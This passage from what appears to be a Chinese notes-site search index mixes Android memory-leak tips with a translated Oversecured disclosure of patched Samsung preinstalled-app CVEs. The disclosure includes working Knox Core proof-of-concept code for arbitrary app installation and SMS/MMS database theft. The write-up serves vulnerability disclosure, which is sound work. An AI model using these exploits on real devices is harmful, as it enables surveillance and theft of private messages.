\u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61 Java\u4ee3\u7801 1. @Override 2. public View getView(int position, View convertView, ViewGroup parent) { 3. ViewHolder vHolder = null; 5. if (convertView == null) { 6. convertView = inflater.inflate(..., null); 8. vHolder = new ViewHolder(); 9. vHolder.img= (ImageView) convertView.findViewById(...); 10. vHolder.tv= (TextView) convertView 11. .findViewById(...); 13. convertView.setTag(vHolder); 14. } else { 16. vHolder = (ViewHolder) convertView.getTag(); 17. } 19. vHolder.img.setImageBitmap(...); 20. vHolder.tv.setText(...); 21. return convertView; 22. } 24. static class ViewHolder { 25. TextView tv; 26. ImageView img; 27. } \u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 http://shinfocom.iteye.com/blog/1231511","title":"2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#3registerreceiverunregisterreceiver","text":"\u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a IntentFilter postFilter = new IntentFilter(); postFilter.addAction(getPackageName() + \".background.job\"); this.registerReceiver(receiver, postFilter); \u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a Java\u4ee3\u7801 1. @Override 2. protected void onDestroy() { 3. this.unregisterReceiver(receiver); 4. super.onDestroy(); 5. }","title":"3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver()."},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#4inputstreamoutputstream","text":"\u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41","title":"4.\u672a\u5173\u95edInputStream/OutputStream\u3002"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#5bitmaprecycle","text":"\u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c \u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61 Java\u4ee3\u7801 1. if(!bitmap.isRecycled()) 2. { 3. bitmap.recycle() 4. } \u9664\u6b64\u4e4b\u5916\uff1a \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options(); bitmapFactoryOptions.inJustDecodeBounds = true; bitmapFactoryOptions.inSampleSize = 2; // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true // \u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6 options.inJustDecodeBounds = false; Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options);","title":"5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#6context","text":"\u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a Java\u4ee3\u7801 1. private static Drawable sBackground; 2. @Override 3. protected void onCreate(Bundle state) { 4. super.onCreate(state); 6. TextView label = new TextView(this); 7. label.setText(\"Leaks are bad\"); 9. if (sBackground == null) { 10. sBackground = getDrawable(R.drawable.large\\_bitmap); 11. } 12. label.setBackgroundDrawable(sBackground); 14. setContentView(label); 15. } \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002","title":"6.Context\u6cc4\u6f0f\u3002"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#7static","text":"\u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002","title":"7.static\u5173\u952e\u5b57"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/","text":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237 \u4e09\u661f\u9884\u88c5\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u4e2d\u62ab\u9732\u4e86\u591a\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5982\u679c\u6210\u529f\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\uff0c \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672a\u7ecf\u7528\u6237\u540c\u610f\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e2a\u4eba\u6570\u636e\u5e76\u63a7\u5236\u8bbe\u5907\u3002 \u201c\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u548c\u7f16\u8f91\u53d7\u5bb3\u8005\u7684\u8054\u7cfb\u4eba\u3001\u7535\u8bdd\u3001\u77ed\u4fe1/\u5f69\u4fe1\uff0c\u5b89\u88c5\u5177\u6709\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u4ee3\u8868\u7cfb\u7edf\u7528\u6237\u8bfb\u5199\u4efb\u610f\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66f4\u6539\u8bbe\u5907\u7684\u8bbe\u7f6e\uff0c\u201d\u79fb\u52a8\u5b89\u5168\u521d\u521b\u516c\u53f8 Oversecured \u7684\u521b\u59cb\u4eba Sergey Toshin\u5728\u5468\u56db\u53d1\u5e03\u7684\u4e00\u4efd\u5206\u6790\u62a5\u544a\u4e2d \u8868\u793a \u3002 Toshin \u4e8e 2021 \u5e74 2 \u6708\u5411\u4e09\u661f\u62a5\u544a\u4e86\u8fd9\u4e9b\u7f3a\u9677\uff0c\u968f\u540e\u5236\u9020\u5546 \u53d1\u5e03 \u4e86 \u8865\u4e01\uff0c \u4f5c\u4e3a\u5176 4 \u6708\u548c 5 \u6708\u7684\u6708\u5ea6\u5b89\u5168\u66f4\u65b0\u7684\u4e00\u90e8\u5206\u3002 \u4e03\u4e2a\u6f0f\u6d1e\u5217\u8868\u5982\u4e0b: CVE-2021-25356 \u2013 \u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u7b2c\u4e09\u65b9\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-25388 \u2013 Knox Core \u4e2d\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u6f0f\u6d1e CVE-2021-25390 \u2013 PhotoTable \u4e2d\u7684 \u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25391 \u2013 \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25392 \u2013 \u53ef\u4ee5\u8bbf\u95ee DeX \u7684 \u901a\u77e5\u7b56\u7565\u6587\u4ef6 CVE-2021-25393 \u2013 \u53ef\u4ee5\u4f5c\u4e3a\u7cfb\u7edf\u7528\u6237\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee\uff08\u5f71\u54cd\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff09 CVE-2021-25397 \u2013 TelephonyUI \u4e2d\u7684 \u4efb\u610f\u6587\u4ef6\u5199\u5165 \u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u610f\u5473\u7740\u5b83\u4eec\u53ef\u80fd\u88ab\u5229\u7528\u6765\u5b89\u88c5\u4efb\u610f\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3001\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u5220\u9664\u5176\u4ed6\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7a83\u53d6\u654f\u611f\u6587\u4ef6\u3001\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\u8bfb\u53d6\u6216\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u751a\u81f3\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002 \u5728\u6982\u5ff5\u9a8c\u8bc1 (PoC) \u6f14\u793a\u4e2d\uff0cOversecured \u786e\u5b9a\u53ef\u4ee5\u5229\u7528 PhotoTable \u548c Secure Folder \u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411\u7f3a\u9677\u6765\u52ab\u6301\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee SD \u5361\u548c\u8bfb\u53d6\u5b58\u50a8\u5728\u624b\u673a\u4e2d\u7684\u8054\u7cfb\u4eba\u7684\u6743\u9650\u3002\u540c\u6837\uff0c\u901a\u8fc7\u5229\u7528 CVE-2021-25397 \u548c CVE-2021-25392\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u6076\u610f\u5185\u5bb9\u8986\u76d6\u5b58\u50a8 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\uff0c\u5e76\u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e\u3002 \u5efa\u8bae\u4e09\u661f\u8bbe\u5907\u6240\u6709\u8005\u5e94\u7528\u8be5\u516c\u53f8\u7684\u6700\u65b0\u56fa\u4ef6\u66f4\u65b0\uff0c\u4ee5\u907f\u514d\u4efb\u4f55\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u8fd9\u4e9b \u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u8fdd\u53cd GDPR \uff0c\u6211\u4eec\u5f88\u9ad8\u5174\u80fd\u591f\u5e2e\u52a9\u4e09\u661f\u53ca\u65f6\u8bc6\u522b\u548c\u4fee\u590d\u8fd9\u4e9b\u6f0f\u6d1e\u3002 \u5982\u679c\u60a8\u662f\u5f00\u53d1\u4eba\u5458\u6216\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\uff0c\u60a8\u53ef\u4ee5\u5c06 Oversecured \u96c6\u6210\u5230\u60a8\u7684 CI/CD \u4e2d\uff0c\u4ee5\u4e3b\u52a8\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u4fb5\u5bb3\u3002 CI/CD \u8fc7\u7a0b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u63d2\u4ef6\u5b8c\u5168\u81ea\u52a8\u5316\u3002\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u5c06\u6301\u7eed\u76d1\u63a7\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5728\u68c0\u6d4b\u5230\u4efb\u4f55\u65b0\u6f0f\u6d1e\u65f6\u63d0\u9192\u60a8\u3002 \u4ece Quick Start \u5f00\u59cb\u8bd5\u7528\uff0c\u5f00\u59cb\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u60a8\u53ef\u4ee5 \u5728\u6b64\u5904 \u8054\u7cfb\u6211\u4eec\u4ee5\u4e86\u89e3\u66f4\u591a\u4fe1\u606f\u5e76\u83b7\u53d6\u6f14\u793a\u3002 \u5982\u679c\u60a8\u662f\u4e00\u540d\u5b89\u5168\u7814\u7a76\u4eba\u5458\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 Oversecured \u7684\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u626b\u63cf\u5668\u626b\u63cf\u8fd9\u4e9b\u9519\u8bef\uff0c\u4ece\u800c\u81ea\u52a8\u6267\u884c\u9519\u8bef\u68c0\u6d4b\u8fc7\u7a0b\u3002\u60a8\u6240\u8981\u505a\u7684\u5c31\u662f \u6ce8\u518c \u5e76\u4e0a\u4f20\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u3002\u6211\u4eec\u7684\u626b\u63cf\u4eea\u5c06\u8d1f\u8d23\u5176\u4f59\u7684\u5de5\u4f5c\u3002 \u6f0f\u6d1e\u8be6\u60c5\u5217\u8868\uff1a CVE SVE \u53d7\u5f71\u54cd\u7684\u5e94\u7528 \u63cf\u8ff0 \u5956\u52b1\u91d1\u989d CVE-2021-25388 SVE-2021-20636 Knox Core (com.samsung.android.knox.containercore) \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u548c\u8bbe\u5907\u8303\u56f4\u5185\u7684\u4efb\u610f\u6587\u4ef6\u76d7\u7a83 1720 \u7f8e\u5143 CVE-2021-25356 SVE-2021-20733 \u6258\u7ba1\u914d\u7f6e (com.android.managedprovisioning) \u5b89\u88c5\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u5e76\u6388\u4e88\u4ed6\u4eec\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650 7000 \u7f8e\u5143 CVE-2021-25391 SVE-2021-20500 \u5b89\u5168\u6587\u4ef6\u5939 (com.samsung.knox.securefolder) \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u5546 1050 \u7f8e\u5143 CVE-2021-25393 SVE-2021-20731 SecSettings (com.android.settings) \u83b7\u5f97\u5bf9\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u6743\u9650\u5bfc\u81f4\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\uff08UID 1000\uff09\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee 5460 \u7f8e\u5143 CVE-2021-25392 SVE-2021-20690 \u4e09\u661f DeX \u7cfb\u7edf UI (com.samsung.desktopsystemui) \u80fd\u591f\u7a83\u53d6\u901a\u77e5\u7b56\u7565\u914d\u7f6e 330 \u7f8e\u5143 CVE-2021-25397 SVE-2021-20716 TelephonyUI (com.samsung.android.app.telephonyui) \uff08\u8986\u76d6\uff09\u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5165\u4e3a UID 1001 4850 \u7f8e\u5143 CVE-2021-25390 SVE-2021-20724 PhotoTable (com.android.dreams.phototable) \u610f\u56fe\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bbf\u95ee\u4efb\u610f\u5185\u5bb9\u63d0\u4f9b\u8005 280 \u7f8e\u5143 Knox Core \u4e2d\u7684\u6f0f\u6d1e \u9996\u5148\uff0c\u6211\u4eec\u626b\u63cf\u4e86 Knox Core \u5e94\u7528\u7a0b\u5e8f\uff0c\u53d1\u73b0\u4ece SD \u5361\u5b89\u88c5\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a \u4e8b\u5b9e\u8bc1\u660e\uff0c\u6b64\u529f\u80fd\u662f\u901a\u8fc7\u5bfc\u51fa\u7684\u670d\u52a1\u6fc0\u6d3b\u7684 com.samsung.android.knox.containercore.provisioning.DualDARInitService \uff1a <service android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\" android:exported=\"true\"> <intent-filter> <action android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"/> </intent-filter> </service> \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 dualdar-config-client-location \u53c2\u6570\u4f20\u9012\u4efb\u610f URI\uff0c\u8be5\u53c2\u6570\u5c06\u88ab\u590d\u5236\u5230 /sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk \uff0c\u8fd9\u662f\u4e00\u4e2a\u4e16\u754c\u53ef\u8bfb\u7684\u4f4d\u7f6e\u3002 \u4e4b\u540e\uff0c\u5c06\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u8fc7\u7a0b\uff1a private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) { if (intent.getBooleanExtra(\"DUAL_DAR_IS_WPCOD\", false)) { int intExtra = intent.getIntExtra(\"android.intent.extra.user_handle\", UserHandle.myUserId()); Bundle bundleExtra = intent.getBundleExtra(\"DUAL_DAR_PARAMS\"); String string = bundleExtra.getString(\"dualdar-config-client-package\", null); if (!TextUtils.isEmpty(string)) { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto\"); String string2 = bundleExtra.getString(\"dualdar-config-client-location\"); // attacker-controlled URI DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = \" + string2); if (TextUtils.isEmpty(string2)) { notifyMPError(5); } else if (string2.startsWith(\"file://\")) { String str = getExternalFilesDir(null) + \"/client_downloaded_knox_app.apk\"; try { // attacker-controlled file is copied to the public location ((SemRemoteContentManager) this.mContext.getSystemService(\"rcp\")).copyFile(intExtra, string2.replaceFirst(\"^file://\", \"\"), intExtra, str); installPackageTask(intent, string, str); // and then installed } catch (RemoteException unused) { DDLog.m3e(\"KNOXCORE::DualDARInitService\", \"copyFile failed.\"); notifyMPError(5); } } else if (string2.startsWith(\"https://\")) { downloadPackageTask(intent, string, string2); } else { notifyMPError(5); } } else { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD native crypto\"); startRunnerTask(intent); } } } \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u7684\u6982\u5ff5\u8bc1\u660e protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); try { Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(copyFile()).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); startService(i); } catch (Throwable th) { throw new RuntimeException(th); } } private File copyFile() throws Throwable { File file = new File(getApplicationInfo().dataDir, \"app.apk\"); InputStream i = getAssets().open(\"app-release.apk\"); OutputStream o = new FileOutputStream(file); IOUtils.copy(i, o); i.close(); o.close(); return file; } SMS/MMS \u6587\u4ef6\u76d7\u7a83\u7684\u6982\u5ff5\u8bc1\u660e protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); startDump(); try { File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(dbPath).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); new Thread(() -> { for(int j = 1; j < 1000; j++) { startService(i); try { Thread.sleep(500); } catch (Throwable th) { throw new RuntimeException(th); } } }).start(); } catch (Throwable th) { throw new RuntimeException(th); } } private void startDump() { final String path = \"/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk\"; ContentValues values = new ContentValues(); values.put(\"_data\", path); Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri(\"external\"), values); new Thread(new Runnable() { public void run() { while (true) { try { InputStream i = getContentResolver().openInputStream(uri); String data = IOUtils.toString(i); Log.d(\"evil\", data); i.close(); } catch (Throwable th) { } } } }).start(); } PoC \u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a \u542f\u52a8\u670d\u52a1\u5c06\u6240\u9700\u6587\u4ef6\u590d\u5236\u5230\u516c\u5171\u4f4d\u7f6e\uff08\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u65e0\u6548\u7684APK\u6587\u4ef6\uff0c\u5b89\u88c5\u9519\u8bef\u540e\u4f1a\u7acb\u5373\u5220\u9664\uff09\uff0c \u7136\u540e\uff0c client_downloaded_knox_app.apk \u8bfb\u53d6\u6587\u4ef6\u3002 \u6ce8\u610f\uff1a \u6211\u4eec\u4f7f\u7528 MediaStore.Files \u662f\u56e0\u4e3a\u6700\u65b0\u7684 Android \u7248\u672c\u4e0d\u5141\u8bb8\u76f4\u63a5\u8bfb\u53d6\u5c5e\u4e8e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u5916\u90e8\u5b58\u50a8\uff0c\u4f46\u8fd9\u53ef\u4ee5\u4f7f\u7528 Android Media Content Provider \u7ed5\u8fc7\u3002 